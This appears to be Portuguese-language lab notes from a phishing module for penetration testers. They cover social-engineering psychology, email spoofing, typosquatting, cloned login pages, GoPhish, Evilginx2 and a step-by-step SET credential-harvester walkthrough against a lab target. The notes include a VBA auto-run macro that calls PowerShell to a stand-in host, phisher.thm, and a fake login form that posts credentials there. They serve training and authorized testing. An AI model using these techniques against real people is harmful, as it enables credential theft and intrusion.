<!-- ===================================== -->
<!--              PHISHING                 -->
<!-- ===================================== -->
<p align="center">
  <img src="https://img.shields.io/badge/Category-Offensive%20Security-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Focus-Social%20Engineering-blue?style=for-the-badge">
</p>
<p align="center">
  <img src="https://img.shields.io/badge/Platform-Multi--Plataforma-black?style=flat-square">
  <img src="https://img.shields.io/badge/Discipline-Penetration%20Testing-purple?style=flat-square">
  <img src="https://img.shields.io/badge/Level-Beginner%20→%20Intermediate-yellow?style=flat-square">
  <img src="https://img.shields.io/badge/Status-Lab%20Documentation-green?style=flat-square">
</p>

---

# 📚 Phishing
## Engenharia Social como Vetor de Acesso Inicial
> Do e-mail em massa ao spear phishing direcionado: como o fator humano continua sendo o elo mais explorado em testes de intrusão, mesmo diante das defesas técnicas mais robustas.

---
# Phishing

### O Cenário: O Elo Mais Fraco

Imagine a situação: você foi incumbido de penetrar as defesas de uma empresa durante um teste de intrusão. Os firewalls são extremamente robustos e os sistemas de detecção de intrusão, impenetráveis. Mas existe uma vulnerabilidade que **nenhuma tecnologia consegue eliminar completamente**: o fator humano.

![](https://storage.googleapis.com/cdn-website-bolddesk/2026/01/4368a6a4-spot-and-avoid-phishing-attacks.webp)

### Por que Phishing?

**Phishing** é uma das ferramentas mais poderosas no arsenal de um testador de penetração. Por quê? Porque mesmo as organizações mais seguras dependem de **pessoas**, e pessoas podem ser enganadas, manipuladas e persuadidas a revelar seu acesso.

|Aspecto|Impacto|
|---|---|
|**Eficácia**|Frequentemente a maneira mais fácil de obter acesso inicial|
|**Controle**|Um único e-mail bem elaborado pode contornar controles técnicos|
|**Resultado**|Pode instalar malware, roubar credenciais ou desbloquear acesso à rede|

> 💡 **Fato:** Estudos mostram que até **90%** dos ataques cibernéticos bem-sucedidos começam com um e-mail de phishing.

---
## O que é Phishing?

### Definição

Phishing é uma forma de ataque cibernético que usa **engenharia social** para enganar as pessoas e levá-las a:

- Revelar informações confidenciais
- Executar malware em seus dispositivos
- Realizar ações que comprometem a segurança

Os atacantes enganam as vítimas se passando por **fontes legítimas** através de:

- 📧 E-mails
- 📱 Mensagens de texto (SMS - **Smishing**)
- 📞 Ligações telefônicas (**Vishing**)
- 🌐 Sites falsos

### Por que Funciona?

Phishing explora a **psicologia humana** em vez de vulnerabilidades técnicas:

- ✅ Cria narrativas convincentes
- ✅ Aplica táticas de pressão
- ✅ Manipula emoções
- ✅ Explora confiança e autoridade

### Tipos de Phishing

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/62ff64c3c859dc0042b2b9f6/room-content/62ff64c3c859dc0042b2b9f6-1775551569683.png)

#### 1. Phishing em Massa

**Características:**

- "Lança uma rede para todos os lados"
- Mensagem convincente enviada para **muitas pessoas**
- Temas comuns: alertas de conta, faturas, atualizações
- Conteúdo **genérico** ou ligeiramente impreciso

**Objetivo:** Ganhos rápidos em grande escala (senhas, dados de cartão, acesso)

#### 2. Spear Phishing

**Características:**

- Ataque **direcionado** a uma pessoa específica
- Mensagem **personalizada** baseada em reconhecimento
- Conteúdo relevante para o alvo

**Objetivo:**

- Fazer o alvo clicar em um link
- Abrir um arquivo malicioso
- Executar uma tarefa
- Fornecer credenciais para acesso mais profundo

#### 3. Whaling

**Características:**

- Spear phishing **focado em executivos**
- Alvos: CEOs, CFOs, diretores
- Objetivos de **alto valor**    

**Distinção:**

|Aspecto|Spear Phishing|Whaling|
|---|---|---|
|**Alvo**|Qualquer funcionário|Executivos de alto nível|
|**Objetivo**|Acesso à rede|Dados financeiros, regulamentados|
|**Impacto**|Moderado|Crítico|

### Phishing em Testes de Penetração

Em testes de penetração, phishing é essencial para:

1. **Avaliar vulnerabilidade** a ataques de engenharia social
2. **Descobrir fraquezas humanas** dentro da organização
3. **Avaliar riscos** de violações de dados ou infecções por malware
4. **Preparar defesas** contra ameaças reais

**Boa prática:** Hackers éticos criam e-mails que se assemelham muito a ameaças reais **sem causar danos**, rastreando:

- 📊 Taxas de abertura
- 📊 Taxas de cliques
- 📊 Comportamento dos funcionários

---
## Psicologia do Phishing

### Engenharia Social: Os 6 Princípios

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/62ff64c3c859dc0042b2b9f6/room-content/62ff64c3c859dc0042b2b9f6-1775468868416.png)

#### 1. Escassez (Scarcity)

**Como funciona:** Faz algo parecer raro, levando a ação imediata.

**Psicologia por trás:**

- FOMO (Fear Of Missing Out) - Medo de ficar de fora
- Aversão à perda: detestamos perder mais do que gostamos de ganhar

**Palavras-chave:** "limitado", "última chance", "termina hoje"

**Exemplo:**

> "Apenas três TryPhones disponíveis na promoção de hoje."

#### 2. Urgência (Urgency)

**Como funciona:** Cria uma contagem regressiva, priorizando velocidade sobre análise.

**Psicologia por trás:**

- Pressão do tempo reduz atenção
- Diminui verificação cuidadosa
- Consequências parecem reais (bloqueios, atrasos)

**Palavras-chave:** "dentro de 24 horas", "imediatamente", "prazo expirado"

**Exemplo:**

> "Sua conta será suspensa em 12 horas, a menos que você verifique sua identidade."

#### 3. Autoridade (Authority)

**Como funciona:** Apoia-se em status ou experiência percebidos para obter obediência.

**Psicologia por trás:**

- Pessoas seguem instruções de líderes e especialistas
- Sinais visuais (títulos, assinaturas) aumentam o efeito

**Elementos:** Títulos formais, assinaturas, rótulos de função (RH, TI)

**Exemplo:**

> "De: Administrador de TI. Ação necessária em suas configurações de SSO."

#### 4. Medo (Fear)

**Como funciona:** Utiliza ameaças para desencadear reação de proteção imediata.

**Psicologia por trás:**

- Ansiedade sobrepõe ceticismo
- Risco pessoal (comprometimento de conta, problemas legais)

**Palavras-chave:** "alerta de segurança", "violação", "acesso não autorizado"

**Exemplo:**

> "Detectamos logins suspeitos em sua conta. Proteja-a imediatamente."

#### 5. Curiosidade (Curiosity)

**Como funciona:** Atrai atenção prometendo informações interessantes.

**Psicologia por trás:**

- Cérebro busca preencher lacunas de informação
- Supera cautela quando a provocação parece relevante

**Características:** Assuntos curtos, intrigantes, ligeiramente vagos

**Exemplo:**

> "Confidencial: Destaques do roteiro do terceiro trimestre."

#### 6. Confiança (Trust)

**Como funciona:** Aproveita marcas, colegas ou estilos familiares.

**Psicologia por trás:**

- Nomes reconhecíveis reduzem ceticismo
- Rotinas comuns (relatórios mensais) parecem seguras

**Exemplo:**

> "Microsoft 365: Novo aviso de segurança disponível no seu portal."

### Vieses Cognitivos

#### 1. Viés de Excesso de Confiança

- Muitas pessoas, especialmente profissionais de segurança, acham que são **inteligentes demais** para cair em golpes
- **Resultado:** Menor vigilância na verificação de mensagens suspeitas

#### 2. Viés de Confirmação

- Aceitamos informações que se encaixam em nossas **expectativas**
- **Exemplo:** Se esperamos um e-mail do banco, confiamos em um phishing que finge ser do banco

#### 3. Viés de Autoridade

- Confiamos sem questionar em mensagens de **figuras de autoridade**
- **Exemplo:** E-mail de um funcionário de alto escalão é mais confiável

### Aplicação em Testes de Penetração

Compreender esses princípios psicológicos é **essencial** para pentesters que simulam campanhas de phishing:

1. **Incluir táticas:** Urgência, autoridade, medo
2. **Personalizar:** Adaptar para o alvo específico
3. **Medir eficácia:** Avaliar taxas de resposta
4. **Relatar:** Explicar por que funcionou

---
## Técnicas de Phishing

### Manipulação de URL e Domínio

Como pentester, um dos principais objetivos é fazer com que os alvos cliquem em uma URL que controlamos.

#### 1. Mascaramento de URL

Disfarçar uma URL maliciosa por trás de um hiperlink de aparência legítima.

**Exemplo:**

```html
<!-- Texto exibido -->
<a href="http://phisher.thm">https://tryhackme.com</a>
```

#### 2. Ataques de Homógrafos

Explorar semelhanças visuais entre caracteres.

|Técnica|Exemplo|Legítimo|
|---|---|---|
|Substituição de 'o' por '0'|`go0gle.com`|`google.com`|
|Caracteres cirílicos|`gооgle.com` (com 'o' cirílico)|`google.com`|
|Substituição de 'rn' por 'm'|`arnazon.com`|`amazon.com`|

#### 3. Typosquatting (URL Hijacking)

Registrar domínios semelhantes a domínios legítimos, aproveitando erros de digitação.

**Exemplos:**

- `tryhacme.com` (em vez de `tryhackme.com`)
- `facebok.com` (em vez de `facebook.com`)
- `youtbe.com` (em vez de `youtube.com`)

#### 4. Encurtadores de URL

Ocultar o verdadeiro destino de um link.

**Exemplos:**

- `bit.ly/abc123`
- `tinyurl.com/xyz789`
- `goo.gl/def456`

**Por que é eficaz:**

- Mais difícil de inspecionar
- Pode burlar verificações básicas de segurança
- Parece profissional e legítimo

### Fundamentos da Falsificação de E-mail

#### O Problema com SMTP

O **SMTP (Simple Mail Transfer Protocol)** não possui funcionalidade integrada para autenticar endereços de e-mail. Isso permite que atacantes modifiquem cabeçalhos de e-mail.

#### Técnicas Comuns

**1. Falsificação do Campo "From"**  
Modificar o endereço do remetente para exibir um remetente confiável.

```python
# Exemplo simplificado em Python
import smtplib
from email.mime.text import MIMEText

msg = MIMEText("Conteúdo do e-mail")
msg['From'] = "support@tryaccounting.thm"  # Falsificado!
msg['To'] = "bob@tryaccounting.thm"
msg['Subject'] = "Urgente: Verificação de Conta"
```

**2. Falsificação do Nome de Exibição**  
Alterar o nome do remetente no cliente de e-mail, mantendo o endereço real oculto.

**Exemplo:**

```html
De: "Suporte de TI" <attacker@gmail.com>
     ↑ Nome exibido          ↑ Endereço real
```

**Por que funciona:** Muitos clientes de e-mail móvel exibem apenas o nome de exibição por padrão.

**3. Domínios Semelhantes**  
Usar domínios que se assemelham a domínios legítimos.

|Legítimo|Falso|
|---|---|
|`support@tryaccounting.com`|`support@tryaccounting-secure.com`|
|`hr@company.com`|`hr-company.com`|
|`it@tryhackme.com`|`it-tryhackme.com`|

#### Exemplo de Cabeçalho Falsificado

**E-mail que o destinatário vê:**

```html
From: Support <support@tryaccounting.thm>
To: bob@tryaccounting.thm
Subject: Urgent: Account Verification Required

Dear Bob,

As part of our security policy, we require all TryAccounting employees to
change their passwords every 3 months. Please log in to our internal portal
and update your password before Friday:

http://tryaccounting-security.thm/account

Thank you,
TryAccounting Support Team
```

**Cabeçalhos reais (ocultos):**

```html
From: Support <support@tryaccounting.thm>
Reply-To: attacker@phisher.thm       ← Credenciais vão para aqui
Return-Path: attacker@phisher.thm     ← Respostas vão para aqui
X-Sender: attacker@phisher.thm        ← Remetente real
Received: from phisher.thm (mail.phisher.thm [192.168.1.25])
          by mail.tryaccounting.thm
```

### Medidas de Segurança de E-mail

|Protocolo|Função|Como Previne|
|---|---|---|
|**SPF** (Sender Policy Framework)|Verifica se o servidor de envio está autorizado|Publica lista de IPs autorizados no DNS|
|**DKIM** (DomainKeys Identified Mail)|Assina digitalmente e-mails|Verifica assinatura criptográfica|
|**DMARC** (Domain-based Message Authentication)|Define política de tratamento|Especifica o que fazer com e-mails não autenticados|

### Coleta de Credenciais

#### Páginas de Login Clonadas

**Processo:**

1. Replicar elementos visuais do site legítimo
2. Hospedar em domínio falso
3. Capturar credenciais enviadas
4. Redirecionar para site legítimo

**O que o alvo vê:**

- Logotipos, fontes e cores idênticas
- Formulário de login familiar
- Redirecionamento para o site real após "falha" de login

**O que o atacante obtém:**

- Nome de usuário
- Senha
- Possíveis tokens de sessão

### Mecanismos de Entrega de Payload

#### 1. Macros em Documentos

**Técnica:**

1. Criar documento Word com macro VBA
2. Mensagem: "Habilite o Conteúdo" para visualizar
3. Macro executa comando oculto

**Fluxo:**

```text
1. Vítima recebe e abre anexo .docm
2. Word solicita habilitação de macros
3. Vítima clica em "Ativar conteúdo"
4. Macro VBA executa comando
5. Atacante recebe confirmação
```

**Código VBA Exemplo:**

```vba
Sub AutoOpen()
    ' Comando silencioso que executa em segundo plano
    Shell "powershell -c Invoke-WebRequest -Uri http://phisher.thm/beacon"
End Sub
```

#### 2. Arquivos Executáveis

**Técnicas de Evasão:**

- **Renomear extensão**: `.exe` → `.pdf.exe`
- **Usar ícones**: Ícone de PDF ou Word
- **Double extension**: `invoice.pdf.exe`
- **Compactar**: Em arquivo .zip com senha

#### 3. Links Maliciosos

**Tipos:**

- Botão "Verifique sua conta"
- Link "Clique aqui para atualizar"
- Redirecionamento automático

### Tabela de Técnicas e Eficácia

|Técnica|Dificuldade|Eficácia|Detecção|
|---|---|---|---|
|**URL Masking**|Baixa|Alta|Fácil (inspecionar link)|
|**Typosquatting**|Média|Alta|Difícil (olho humano)|
|**Homógrafos**|Média|Média|Muito difícil|
|**Falsificação de e-mail**|Baixa|Média|SPF/DKIM/DMARC|
|**Clone de site**|Alta|Muito Alta|URLs e certificados|
|**Macros**|Média|Alta|Antivírus/EDR|
|**Executáveis**|Média|Média|Antivírus|

---
## Ferramentas do Ofício

### 1. GoPhish

![](https://docs.getgophish.com/user-guide/~gitbook/image?url=https%3A%2F%2F732773220-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LDT_qt7WICxCmlM75gA%252F-LOLuduA5T1_kf4hd_Rk%252F-LOM16w4LVlVfVrIGkB3%252Flocalhost_3333_campaigns_25%28macbook%29.png%3Falt%3Dmedia%26token%3D9632e636-be64-42d9-906d-e783ee984a5a&width=768&dpr=3&quality=100&sign=986f944a&sv=2)

**Descrição:** Framework baseado em web para configuração de campanhas de phishing.

**Recursos Principais:**

- 📧 **SMTP:** Configuração de servidores de e-mail
- 📝 **Editor WYSIWYG:** Criação visual de templates
- 📅 **Agendamento:** Programação de envios
- 📊 **Dashboard:** Análise de taxas de abertura e cliques

**Instalação:**

```bash
# Linux
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
./gophish

# Acesse: https://localhost:3333
# Login: admin / (senha gerada no terminal)
```

**Estrutura:**

```text
GoPhish
├── Campaigns (Campanhas)
│   ├── Templates (Templates de e-mail)
│   ├── Sending Profiles (Perfis de envio)
│   └── Landing Pages (Páginas de destino)
├── Users (Usuários-alvo)
│   ├── Groups (Grupos)
│   └── Import (Importação CSV)
└── Results (Resultados)
    ├── Dashboard (Painel)
    └── Reports (Relatórios)
```

### 2. EvilNginx2

![](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_1yOT06PnWN6p8yzlINufslTzTgcp05a-tgJzY80NVA&s=10)

**Descrição:** Framework avançado para phishing com bypass de MFA (Autenticação Multifator).

**Como funciona:**

1. Atua como proxy reverso entre vítima e site legítimo
2. Captura credenciais e tokens de sessão em tempo real
3. Bypassa 2FA/MFA capturando tokens

**Recursos:**

- 🔄 **Proxy reverso:** Intercepta tráfego em tempo real
- 🔐 **Captura de tokens:** Sessões e cookies
- 🛡️ **Bypass de MFA:** Captura códigos 2FA
- 📊 **Dashboard:** Visualização de sessões ativas

**Uso típico:**

```bash
# Configurar domínio de phishing
sudo ./evilginx2 -p phisher.example.com

# Configurar endpoint de captura
creds -c

# Visualizar credenciais capturadas
sessions
```

### 3. Social Engineering Toolkit (SET)

![](https://upload.wikimedia.org/wikipedia/commons/b/bf/Set%28informatic%29.png)

**Descrição:** Conjunto de ferramentas para engenharia social.

**Módulos Principais:**

|Módulo|Função|
|---|---|
|**Spear-Phishing**|Ataques direcionados por e-mail|
|**Website Attack**|Clonagem de sites e coleta de credenciais|
|**Infectious Media**|Geração de mídia infectada|
|**Mass Mailer**|Envio em massa de e-mails|
|**Payload Generator**|Criação de payloads|

**Comandos Básicos:**

```bash
# Iniciar SET
sudo setoolkit

# Menu principal
1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
4) Update SET
5) Exit
```

### Comparação de Ferramentas

|Ferramenta|Facilidade|Recursos|Preço|Ideal para|
|---|---|---|---|---|
|**GoPhish**|Fácil|Médio|Gratuito|Campanhas básicas|
|**SET**|Médio|Alto|Gratuito|Pentesters experientes|
|**EvilNginx2**|Complexo|Muito Alto|Gratuito|Bypass de MFA|
|**PhishMe**|Fácil|Alto|Pago|Empresas|

---
## Anatomia de uma Campanha de Phishing

### O Ciclo de Vida

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/62ff64c3c859dc0042b2b9f6/room-content/62ff64c3c859dc0042b2b9f6-1775468992972.png)

### Fase 1: Planejamento e Definição de Escopo

**Passos Cruciais:**

1. **Definir missão** com o cliente em uma frase
2. **Identificar grupos-alvo** (quem participa, quem não participa)
3. **Técnicas permitidas** (o que pode ser feito)
4. **Métricas específicas** (o que será medido)
5. **Período e volume** (quando e quantos e-mails)
6. **Aprovação legal** (jurídico e compliance)
7. **Regras de engajamento** (limites e contatos de emergência)

**Exemplo de Escopo:**

```text
MISSÃO: Avaliar a resistência dos funcionários do departamento financeiro
        a ataques de spear phishing.

GRUPOS ALVO: - Financeiro (15 usuários)
             - RH (8 usuários)
             - Excluídos: Diretoria (3 usuários)

TÉCNICAS: - E-mails com links maliciosos (sem malware)
          - Páginas de login falsas (sem captura real de credenciais)
          - NÃO permitido: Anexos executáveis

MÉTRICAS: - Taxa de abertura
          - Taxa de cliques
          - Taxa de envio de credenciais
          - Taxa de denúncia

PERÍODO: 5 dias úteis (segunda a sexta)
VOLUME: 2 e-mails por alvo

APROVAÇÃO: Jurídico assinado em DD/MM/AAAA
CONTATO DE EMERGÊNCIA: security@cliente.com
```

### Fase 2: Reconhecimento (OSINT)

**Fontes de Informação Pública:**

|Fonte|Informação Coletada|Uso no Phishing|
|---|---|---|
|**LinkedIn**|Cargo, departamento, projetos|Personalização|
|**Site da empresa**|Estrutura organizacional|Pretexto|
|**Comunicados**|Mudanças, contratações|Urgência|
|**Redes sociais**|Interesses, viagens|Curiosidade|
|**Google Dorks**|E-mails, documentos|Alvos|

**Exemplo de OSINT:**

```bash
# Coletar e-mails do domínio
theHarvester -d tryaccounting.com -l 100 -b google

# Identificar funcionários no LinkedIn
search "tryaccounting" site:linkedin.com

# Verificar comunicados recentes
site:tryaccounting.com "press release"
```

**O que NÃO fazer:**

- ❌ Acessar informações privadas
- ❌ Violar termos de serviço
- ❌ Usar engenharia social contra o alvo antes da campanha

### Fase 3: Desenvolvimento de Cenários e Payloads

**Criando a Mensagem Perfeita:**

1. **Pretexto:** Por que estou enviando este e-mail?
2. **Isca:** O que torna interessante?
3. **Urgência:** Por que agir agora?
4. **CALL TO ACTION:** O que o alvo deve fazer?

**Template de E-mail Eficaz:**

```text
ASSUNTO: [URGÊNCIA] + [ASSUNTO RELEVANTE]

Corpo:
- Saudação personalizada
- Contexto (por que estou enviando)
- Instrução clara (o que fazer)
- Link/ Botão (ação)
- Assinatura (legítima, com cargo)

P.S.: Benefício ou consequência
```

**Exemplo de Payload Inofensivo:**

```html
<!-- Página de login falsa - APENAS PARA TESTE -->
<!DOCTYPE html>
<html>
<head>
    <title>TryAccounting - Login</title>
</head>
<body>
    <h1>TryAccounting Portal</h1>
    <form action="http://phisher.thm/capture" method="POST">
        <input type="text" name="username" placeholder="Usuário">
        <input type="password" name="password" placeholder="Senha">
        <button type="submit">Entrar</button>
    </form>
    <!-- Script de rastreamento sem captura real -->
    <script>
        // Apenas rastreia cliques, não captura dados reais
        console.log("Clique registrado para análise");
    </script>
</body>
</html>
```

### Fase 4: Exploração e Pós-Exploração

**Execução da Campanha:**

1. **Envio:** Em ondas escalonadas ou único envio
2. **Monitoramento:** Aberturas, cliques, envios
3. **Controle:** Botão de interrupção disponível
4. **Pausa:** Imediata se algo sair do escopo

**Métricas em Tempo Real:**

```text
Dashboard:
├── E-mails enviados: 23/23 (100%)
├── Aberturas: 18 (78%)
├── Cliques: 12 (52%)
├── Envios de credenciais: 5 (22%)
├── Denúncias: 2 (9%)
└── Cliques em "Report Phishing": 3 (13%)
```

**Cuidados:**

- ⚠️ Não use malware real
- ⚠️ Não capture credenciais reais
- ⚠️ Use landing pages apenas para rastreamento
- ⚠️ Tenha contatos de emergência prontos

### Fase 5: Relatórios e Debriefing

**Análise dos Resultados:**

|Métrica|O que mede|Benchmark|Recomendação|
|---|---|---|---|
|**Taxa de abertura**|% que abriu o e-mail|50-65% (típico)|Reciclagem de treinamento|
|**Taxa de cliques**|% que clicou no link|8-14% aceitável|Treinamento de conscientização|
|**Taxa de envio de credenciais**|% que enviou dados|<2% baixo risco|Treinamento de identificação|
|**Taxa de detonação**|% que executou anexo|>5-7% alerta|Instruções de segurança|
|**Taxa de denúncia (24h)**|% que denunciou|>40% forte|Campanha de denúncia|

**Estrutura do Relatório:**

```text
RELATÓRIO DE PHISHING
=====================

1. RESUMO EXECUTIVO
   - Objetivo da campanha
   - Principais descobertas
   - Recomendações (alto nível)

2. METODOLOGIA
   - Escopo e alvos
   - Técnicas utilizadas
   - Cronograma
   - Ferramentas

3. RESULTADOS
   - Métricas detalhadas
   - Análise de comportamento
   - Padrões identificados

4. ANÁLISE DE RISCO
   - O que poderia ter acontecido (ataque real)
   - Impacto potencial
   - Probabilidade

5. RECOMENDAÇÕES
   - Treinamentos específicos
   - Controles técnicos
   - Políticas atualizadas
   - Calendário de novos testes

6. APÊNDICES
   - Templates usados
   - Dados anônimos
   - Referências
```

---
## Prática com SET - Social Engineering Toolkit

### Cenário

Após nossa investigação OSINT, identificamos um alvo para nosso ataque de spear phishing:

**Alvo:** Bob, chefe de finanças da TryAccounting

**Informações coletadas:**

- 📧 E-mail: `bob@tryaccounting.thm`
- 🏢 Empresa: TryAccounting
- 📋 Política de senhas rigorosa
- 🛡️ Segurança de e-mail em vigor

**Objetivo:** Obter credenciais de Bob através de um site de phishing

### Passo 1: Acessar a Máquina Virtual

```bash
# Conectar via SSH
ssh attacker@10.66.167.154

# Credenciais
Username: attacker
Password: attacker1234
```

### Passo 2: Iniciar o SET

```bash
# Iniciar Social Engineering Toolkit
sudo setoolkit
```

**Menu Principal:**

```text
Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About
   7) Exit the Social-Engineer Toolkit
```

### Passo 3: Configurar o Ataque

**Selecionar Ataques de Engenharia Social:**

```text
set> 1
```

**Selecionar Vetores de Ataque a Sites:**

```text
   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors          ← Selecionar
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

set> 2
```

**Selecionar Método de Coleta de Credenciais:**

```text
   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method    ← Selecionar
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method

set> 3
```

**Selecionar Importação Personalizada:**

```text
   1) Web Templates
   2) Site Cloner
   3) Custom Import    ← Selecionar

set> 3
```

**Configurar IP e Caminho:**

```text
set:webattack IP address for the POST back in Harvester/Tabnabbing [10.66.167.154]:

set:webattack Path to the website to be cloned: /home/attacker/setoolkit/

[*] Index.html found. Do you want to copy the entire folder or just index.html?

1. Copy just the index.html    ← Selecionar
2. Copy the entire folder

Enter choice [1/2]: 1

set:webattack URL of the website you imported: http://tryacounting.thm

[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:
```

> ⚠️ **Observação:** Há um erro ortográfico intencional no domínio (`tryacounting` em vez de `tryaccounting`). Isso é um exemplo de **typosquatting**.

### Passo 4: Preparar o E-mail de Phishing

**Acessar o Cliente de E-mail:**

```text
URL: http://10.66.167.154:8080
Login: attacker@phisher.thm
Senha: attacker1234
```

**Configurar Aliases para Falsificação:**

1. Clique em "Nova mensagem"
2. Ao lado do campo "De", clique no endereço
3. Selecione `support@tryaccounting.thm` (alias configurado)    

**E-mail a ser enviado:**

```text
Assunto: Ação Necessária: Aviso de Expiração de Senha

Dear Bob,

As part of our security policy, we require all TryAccounting employees
to change their passwords every 3 months. Please log in to our internal
portal and update your password before Friday:

http://tryacounting.thm

Thank you,
TryAccounting Support Team
```

### Passo 5: Executar e Capturar

**Enviar e-mail:**

1. Destinatário: `bob@tryaccounting.thm`
2. Enviar e-mail

**Monitorar terminal SET:**

```text
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: username=bob.wilkinson
POSSIBLE PASSWORD FIELD FOUND: password=***************
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
```

**Credenciais Capturadas:**

- **Usuário:** `bob.wilkinson`
- **Senha:** (capturada com sucesso)

---
## Checklist do Pentester

### Fase 1: Planejamento (1-2 dias)

- **Definir escopo** com o cliente    
- **Obter aprovação legal** (jurídico, compliance)
- **Definir métricas de sucesso**
- **Identificar grupos-alvo** (quem, quantos)
- **Estabelecer contatos de emergência**
- **Definir período da campanha**
- **Criar regras de engajamento**

### Fase 2: Reconhecimento (2-3 dias)

- **Coletar informações públicas** (OSINT)
    - LinkedIn (cargos, departamentos)
    - Site da empresa (estrutura)
    - Comunicados e notícias
    - Redes sociais
    - Google Dorks para e-mails

- **Mapear alvos específicos**    
    - Nomes completos
    - Cargos
    - E-mails (confirmados)
    - Relacionamentos organizacionais

### Fase 3: Desenvolvimento (2-3 dias)

- **Criar templates de e-mail**
    - Pretexto convincente
    - Urgência apropriada
    - CALL TO ACTION claro
    - Assinatura realista

- **Preparar landing pages**    
    - Clonar site legítimo
    - Modificar destinos de POST
    - Adicionar tracking
    - Testar redirecionamento

- **Configurar ferramentas**    
    - GoPhish / SET / EvilNginx2
    - Servidor SMTP
    - Domínios falsos (se usado typosquatting)
    - Certificados SSL (se HTTPS)

### Fase 4: Execução (1-5 dias)

- **Testar campanha em pequena escala**
    - Enviar para si mesmo
    - Verificar entregabilidade
    - Testar landing pages

- **Enviar campanha principal**    
    - Em ondas escalonadas
    - Horário comercial (alta probabilidade)
    - 1-2 e-mails por alvo

- **Monitorar em tempo real**    
    - Taxas de abertura
    - Taxas de cliques
    - Tentativas de envio
    - Denúncias
    - Alertas de segurança

- **Manter botão de interrupção pronto**    
    - Pausar se algo sair do escopo
    - Interromper campanha se detectada

### Fase 5: Relatório (2-3 dias)

- **Analisar dados**
    - Estatísticas descritivas
    - Padrões de comportamento
    - Análise de risco

- **Criar relatório**    
    - Resumo executivo
    - Metodologia
    - Resultados detalhados
    - Análise de risco
    - Recomendações

- **Preparar debriefing**    
    - Apresentação para stakeholders
    - Materiais de treinamento
    - Recomendações técnicas
    - Plano de ação

### Comandos Úteis

**GoPhish:**

```bash
# Iniciar GoPhish
./gophish

# Verificar status
sudo systemctl status gophish

# Acessar dashboard
https://localhost:3333
```

**SET:**

```bash
# Iniciar SET
sudo setoolkit

# Salvar configurações
save

# Verificar status
status
```

**EvilNginx2:**

```bash
# Iniciar EvilNginx
sudo ./evilginx2

# Configurar domínio
config domain phisher.example.com

# Configurar endpoint de captura
creds -c

# Visualizar sessões
sessions
```

---
## Conclusão

### Principais Aprendizados

O phishing continua sendo uma das ameaças mais eficazes porque explora o **fator humano**, que nenhuma tecnologia pode eliminar completamente.

|Aspecto| Conclusão                                                            |
|---|---|
|**Psicologia**| Urgência, medo, autoridade e confiança são gatilhos poderosos        |
|**Técnicas**| Falsificação de e-mail, typosquatting e clones de site são eficazes  |
|**Ferramentas**| SET, GoPhish e EvilNginx2 facilitam campanhas profissionais          |
|**Processo**| Planejamento, OSINT, execução e relatório são igualmente importantes |

### O Futuro do Phishing

**Tendências Emergentes:**

1. **Phishing com IA**
    - E-mails gerados por IA (mais convincentes)
    - Personalização em escala
    - Bypass de detecção de spam

2. **Phishing em Novas Plataformas**    
    - Teams, Slack, Discord
    - Mensagens SMS (Smishing)
    - QR Codes (Quishing)

3. **Bypass de MFA**    
    - EvilNginx2 e proxies reversos
    - Sessão hijacking
    - Tokens de sessão

4. **Phishing Direcionado a APIs**    
    - Tokens de API
    - Chaves de serviço
    - Credenciais de nuvem

### Recomendações Finais

**Para Pentesters:**

1. ✅ Sempre obtenha **autorização por escrito**
2. ✅ Use **payloads inofensivos** (apenas tracking)
3. ✅ Documente **tudo** (cada passo, cada decisão)
4. ✅ Mantenha **comunicação clara** com o cliente
5. ✅ Entregue **recomendações acionáveis**

**Para Organizações:**

1. ✅ Treinamento **contínuo** (não apenas uma vez)
2. ✅ Simulações **regulares** (trimestrais)
3. ✅ Incentive **denúncias** (não punir)
4. ✅ Implemente **SPF, DKIM, DMARC**
5. ✅ Use **MFA** (mesmo que não seja perfeito)

### Próximos Passos

1. **Praticar**:
    - [TryHackMe - Phishing Rooms](https://tryhackme.com/room/phishingyl)
    - [GoPhish Labs](https://getgophish.com/)
    - [SET Tutorials](https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/)

2. **Certificações**:    
    - [CEH - Certified Ethical Hacker](https://www.eccouncil.org/ceh/)
    - [OSCP - Offensive Security Certified Professional](https://www.offensive-security.com/pwk-oscp/)
    - [SANS SEC560 - Network Penetration Testing and Ethical Hacking](https://www.sans.org/cyber-security-courses/network-penetration-testing-ethical-hacking/)

3. **Leitura Adicional**:    
    - "The Art of Deception" - Kevin Mitnick
    - "Social Engineering: The Science of Human Hacking" - Christopher Hadnagy
    - "Phishing Dark Waters" - Christopher Hadnagy

---
## Referências

### Documentação Oficial

**Ferramentas:**

- [Social Engineering Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit)    
- [GoPhish](https://github.com/gophish/gophish)
- [EvilNginx2](https://github.com/kgretzky/evilginx2)
- [King Phisher](https://github.com/securestate/king-phisher)

**Padrões e Frameworks:**

- [MITRE ATT&CK - Phishing](https://attack.mitre.org/techniques/T1566/)
- [NIST SP 800-53 - Security Awareness](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf)
- [ISO 27001 - Information Security](https://www.iso.org/standard/27001)

